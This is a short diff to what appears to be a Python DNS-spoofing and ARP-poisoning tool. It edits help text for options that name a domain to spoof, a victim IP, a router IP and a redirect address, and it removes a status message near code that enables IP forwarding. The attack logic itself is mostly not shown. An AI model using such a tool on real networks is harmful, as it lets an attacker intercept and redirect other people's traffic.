@@ -12,7 +12,8 @@ def arg_parser():
     parser.add_argument("-d", "--domain", help="Choose the domain to spoof. Example: -d facebook.com")
     parser.add_argument("-r", "--routerIP", help="Choose the router IP. Example: -r 192.168.0.1")
     parser.add_argument("-v", "--victimIP", help="Choose the victim IP. Example: -v 192.168.0.5")
-    parser.add_argument("-t", "--redirectto", help="Optional argument to choose the IP to which the victim will be redirected otherwise defaults to attacker's local IP. Requires either the -d or -a argument. Example: -t 80.87.128.67")
+    parser.add_argument("-t", "--redirectto", help="Optional argument to choose the IP to which the victim will be redirected \
+                        otherwise defaults to attacker's local IP. Requires either the -d or -a argument. Example: -t 80.87.128.67")
     parser.add_argument("-a", "--spoofall", help="Spoof all DNS requests back to the attacker or use -r to specify an IP to redirect them to", action="store_true")
     return parser.parse_args()
 
@@ -88,8 +89,6 @@ def main(args):
     if ipf_read != '1\n':
         ipf.write('1\n')
     ipf.close()
-
-    print '[*] iptables queue started and IP forwarding enabled'
 
     routerMAC = originalMAC(args.routerIP)
     victimMAC = originalMAC(args.victimIP)
